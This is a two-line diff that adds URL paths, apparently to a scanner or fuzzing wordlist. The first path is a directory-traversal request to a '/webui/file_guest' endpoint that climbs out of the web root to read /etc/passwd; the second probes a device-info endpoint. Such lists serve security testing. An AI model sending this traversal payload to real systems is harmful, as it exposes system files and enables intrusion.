@@ -1,0 +1,2 @@
+/webui/file_guest?path=/var/www/documentation/../../../../../etc/passwd&flags=1152
+/webui/device_info/device_info
